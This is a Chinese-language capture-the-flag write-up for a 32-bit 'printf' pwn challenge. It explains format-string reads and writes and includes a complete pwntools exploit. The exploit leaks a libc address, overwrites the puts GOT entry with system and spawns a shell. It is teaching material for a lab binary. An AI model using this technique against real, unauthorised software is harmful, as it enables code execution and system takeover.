# shiyanba--pwn--printf

ida打开，32位的题

```
setbuf(stdout, 0);
ask_username(&s1);
ask_password(&s1);
```

```c++
char *__cdecl ask_username(char *dest)
{
  char src[40]; // [esp+14h] [ebp-34h]
  int i; // [esp+3Ch] [ebp-Ch]

  puts("Connected to ftp.hacker.server");
  puts("220 Serv-U FTP Server v6.4 for WinSock ready...");
  printf("Name (ftp.hacker.server:Rainism):");
  __isoc99_scanf("%40s", src);
  for ( i = 0; i <= 39 && src[i]; ++i )
    ++src[i];
  return strcpy(dest, src);
}

int __cdecl ask_password(char *s1)
{
  if ( strcmp(s1, "sysbdmin") )
  {
    puts("who you are?");
    exit(1);
  }
  return puts("welcome!");
}
```

有层验证用户名的代码，用户名是 sysbdmin ，我们输入的字符会自动加一，那我们先输入减一的进去，即rxraclhm

进入主程序，我们可以输入get,put,dir进行不同的操作

- put：生成一个文件，自定义文件名跟内容
- get: 根据输入的文件名，打印对应内容
- dir: 可以打印所有文件名，最后输入的文件名在最前面，而且两个文件名“无缝衔接”

get_file函数里面可以看到存在格式化字符串漏洞

```c++
int get_file()
{
  char dest; // [esp+1Ch] [ebp-FCh]
  char s1; // [esp+E4h] [ebp-34h]
  char *i; // [esp+10Ch] [ebp-Ch]

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &s1);
  if ( !strncmp(&s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, &s1) )
    {
      strcpy(&dest, i + 40);
      return printf(&dest);   //漏洞   下断点位置
    }
  }
  return printf(&dest);
```

### 格式化字符串：

当我们输入printf可识别的格式化字符串时，printf会将其作为格式化字符串进行解析并输出。原理很简单，形如printf(“%s”,“Hello world”)的使用形式会把第一个参数%s作为格式化字符串参数进行解析，在这里由于我们直接用printf输出一个变量，当变量也正好是格式化字符串时，自然就会被printf解析。

输出的内容正好是esp-4开始往下的一连串数据。所以理论上我们可以通过叠加%x来获取有限范围内的栈数据。

%d - 十进制 - 输出十进制整数
%s - 字符串 - 从内存中读取字符串
%x - 十六进制 - 输出十六进制数
%c - 字符 - 输出字符
%p - 指针 - 指针地址
%n - 到目前为止所写的字符数

0x01格式化字符串可以使用一种特殊的表示形式来指定处理第n个参数，如输出第五个参数可以写为%4$s，第六个为%5$s，需要输出第n个参数就是%(n-1)$[格式化控制符]。

0×02 使用格式化字符串漏洞任意写虽然我们可以利用格式化字符串漏洞达到任意地址读，但是我们并不能直接通过读取来利用漏洞getshell，我们需要任意地址写。因此我们在本节要介绍格式化字符串的另一个特性——使用printf进行写入。

printf有一个特殊的格式化控制符%n，和其他控制输出格式和内容的格式化字符不同的是，这个格式化字符会将已输出的字符数写入到对应参数的内存中。

### 实现任意地址读

```
from pwn import *
context.log_level = 'debug'

cn = process('str')
cn.sendline(p32(0x08048000)+"%6$s")
#cn.sendline("%7$s"+p32(0x08048000))
print cn.recv()
```

### 实现任意地址写

```
#include <stdio.h>

int main(void)
{
    int c = 0; 
    printf("%.100d%n", c,&c);
    printf("\nthe value of c: %d\n", c);
    return 0;
}

```



## 利用思路

通过格式化字符串改写GOT表的内容，将system()地址覆盖到已有的puts()函数地址，然后调用puts()函数的时候就会转到system()，再设计参数为”/bin/sh”就可以实现执行system(“/bin/sh”)进而拿到shell。

本题的关键在于将got.plt表中的puts替换为system的地址

### 第一步 确定system的地址

gdb运行 下断点在printf

可见 格式化字符串偏移为7

```

```

我们先要泄露出puts_got的内容，与我们的libc文件比较得出offset

system的实际地址 = system_libc + offset

我们构造泄露puts_got的payload

```python
puts_got = elf.got['puts']
payload='%8$s' + p32(puts_got)     
```



### 第二步 将system地址放在puts_got地址处

0x0804a028 :   system_addr的低四位
0x0804a02a :   system_addr的高四位

```python
#构造的payload

payload1 = p32(puts_got_addr) + '%%%dc' % ((system_addr & 0xffff)-4) + '%7$hn'
payload2 = p32(puts_got_addr+2) + '%%%dc' % ((system_addr>>16 & 0xffff)-4) + '%7$hn'

#payload1 = "x28xa0x04x08%396c%7$hn"
#payload2 = "x2axa0x04x08%46942c%7$hn"

```

解释’%%%dc’ % ((system_addr & 0xffff)-4):

这里以system_addr=0xb7620190 为例

这个是将system_addr的低地址4bytes转化为数字，从而将0x0804a028的位置写为0x0190(396)；将0x0804a02a的位置写为0xb762(46942)。



exp：

```python
from pwn import *

context.log_level='debug'
p=process('pwn3')
elf=ELF('pwn3')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
puts_got=elf.got['puts']

p.recvuntil(':')
p.sendline('rxraclhm')

p.recvuntil('>')
p.sendline('put')
p.recv()
p.sendline('/sh')
p.recv()

payload='%8$s' + p32(puts_got)
p.sendline(payload)
gdb.attach(p)
p.recvuntil('>')
p.sendline('get')
p.recv()
p.sendline('/sh')
t=p.recv()[0:4]
puts_addr=u32(t)
print 'puts==>'+hex(puts_addr)

system=libc.symbols['system']-libc.symbols['puts']+puts_addr
print 'system==>'+hex(system)

p.sendline('put')
p.recv()
p.sendline('/bin')
p.recv()
payload=fmtstr_payload(7,{puts_got:system})
p.sendline(payload)
p.recv()
p.sendline('get')
p.recv()
p.sendline('/bin')
p.recv()
p.sendline('dir')
p.interactive()
```

